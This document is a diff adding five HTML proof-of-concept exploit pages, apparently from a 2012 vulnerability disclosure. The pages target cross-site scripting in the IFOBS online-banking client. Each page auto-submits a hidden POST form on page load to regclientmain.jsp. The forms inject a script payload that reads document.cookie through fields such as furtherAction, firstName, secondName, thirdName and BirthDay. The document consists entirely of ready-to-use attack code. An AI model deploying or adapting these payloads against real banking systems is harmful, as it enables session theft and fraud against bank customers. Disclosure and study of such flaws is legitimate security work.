@@ -1,0 +1,106 @@
+IFOBS XSS-6.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive. 
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientmain.jsp"; 
+method="post">
+<input type="hidden" name="login" value="111111">
+<input type="hidden" name="id" value="1111">
+<input type="hidden" name="myaction" value="login">
+<input type="hidden" name="furtherAction" 
+value='"><script>alert(document.cookie)</script>'>
+</form>
+</body>
+</html>
+
+IFOBS XSS-7.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive. 
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientmain.jsp"; 
+method="post">
+<input type="hidden" name="secondName" 
+value='"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="BirthDay" value="01">
+<input type="hidden" name="BirthMonth" value="01">
+<input type="hidden" name="BirthYear" value="2012">
+<input type="hidden" name="myaction" value="submitform">
+<input type="hidden" name="typeclient" value="standart">
+</form>
+</body>
+</html>
+
+IFOBS XSS-8.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive. 
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientmain.jsp"; 
+method="post">
+<input type="hidden" name="firstName" 
+value='"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="BirthDay" value="01">
+<input type="hidden" name="BirthMonth" value="01">
+<input type="hidden" name="BirthYear" value="2012">
+<input type="hidden" name="myaction" value="submitform">
+<input type="hidden" name="typeclient" value="standart">
+</form>
+</body>
+</html>
+
+IFOBS XSS-9.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive. 
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientmain.jsp"; 
+method="post">
+<input type="hidden" name="thirdName" 
+value='"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="BirthDay" value="01">
+<input type="hidden" name="BirthMonth" value="01">
+<input type="hidden" name="BirthYear" value="2012">
+<input type="hidden" name="myaction" value="submitform">
+<input type="hidden" name="typeclient" value="standart">
+</form>
+</body>
+</html>
+
+IFOBS XSS-10.html
+
+<html>
+<head>
+<title>IFOBS XSS exploit (C) 2012 MustLive. 
+http://www.example.com</title>
+</head>
+<body onLoad="document.hack.submit()">
+<form name="hack"
+action="http://www.example1.com/ifobsClient/regclientmain.jsp"; 
+method="post">
+<input type="hidden" name="BirthDay" 
+value='</script><script>alert(document.cookie)</script>'>
+<input type="hidden" name="BirthMonth" value="01">
+<input type="hidden" name="BirthYear" value="2012">
+<input type="hidden" name="myaction" value="submitform">
+<input type="hidden" name="typeclient" value="standart">
+</form>
+</body>
+</html>
